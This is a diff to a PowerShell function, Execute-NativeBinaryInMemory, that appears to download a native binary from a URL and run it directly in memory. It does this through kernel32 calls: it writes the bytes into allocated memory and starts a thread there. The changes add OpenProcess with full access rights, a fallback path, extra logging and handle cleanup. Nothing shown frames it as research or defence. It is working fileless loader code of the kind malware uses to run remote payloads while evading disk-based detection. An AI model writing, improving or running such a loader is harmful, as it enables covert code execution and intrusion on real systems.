@@ -29,6 +29,15 @@ function Execute-NativeBinaryInMemory {
             
             [DllImport("kernel32.dll", SetLastError = true)]
             public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+            
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+            
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern uint GetCurrentProcessId();
+            
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool CloseHandle(IntPtr hObject);
         }
 "@
 
@@ -42,19 +51,33 @@ function Execute-NativeBinaryInMemory {
         }
         Write-Output "Memory allocated at address: $memPtr"
 
-        # Get the current process handle
-        $processHandle = [NativeExecution]::GetCurrentProcess()
+        # Get the current process ID and open a handle with full access
+        $processId = [NativeExecution]::GetCurrentProcessId()
+        Write-Output "Current process ID: $processId"
+        $PROCESS_ALL_ACCESS = 0x1F0FFF
+        $processHandle = [NativeExecution]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
         if ($processHandle -eq [IntPtr]::Zero) {
-            Write-Error "Failed to get current process handle. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-            return
+            Write-Error "Failed to open current process handle with full access. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+            Write-Output "Falling back to GetCurrentProcess()"
+            $processHandle = [NativeExecution]::GetCurrentProcess()
+            if ($processHandle -eq [IntPtr]::Zero) {
+                Write-Error "Fallback failed. Unable to get current process handle. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+                return
+            }
         }
         Write-Output "Current process handle obtained: $processHandle"
 
         # Write the binary to the allocated memory
         $bytesWritten = 0
+        Write-Output "Attempting to write $memSize bytes to memory at $memPtr"
         $success = [NativeExecution]::WriteProcessMemory($processHandle, $memPtr, $binaryData, $memSize, [ref]$bytesWritten)
         if (-not $success) {
             Write-Error "Failed to write binary to memory. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+            Write-Output "Bytes attempted: $memSize, Bytes written: $bytesWritten"
+            # Clean up handle if it was opened with OpenProcess
+            if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
+                [NativeExecution]::CloseHandle($processHandle)
+            }
             return
         }
         Write-Output "Wrote $bytesWritten bytes to memory"
@@ -64,6 +87,9 @@ function Execute-NativeBinaryInMemory {
         $threadHandle = [NativeExecution]::CreateThread([IntPtr]::Zero, 0, $memPtr, [IntPtr]::Zero, 0, [ref]$threadId)
         if ($threadHandle -eq [IntPtr]::Zero) {
             Write-Error "Failed to create thread for execution. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+            if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
+                [NativeExecution]::CloseHandle($processHandle)
+            }
             return
         }
         Write-Output "Thread created with ID: $threadId"
@@ -71,6 +97,11 @@ function Execute-NativeBinaryInMemory {
         # Wait for the thread to complete
         [NativeExecution]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
         Write-Output "Executed native binary from $Url in memory."
+
+        # Clean up handle if it was opened with OpenProcess
+        if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
+            [NativeExecution]::CloseHandle($processHandle)
+        }
     }
     catch {
         Write-Error "Error executing native binary in memory: $_"
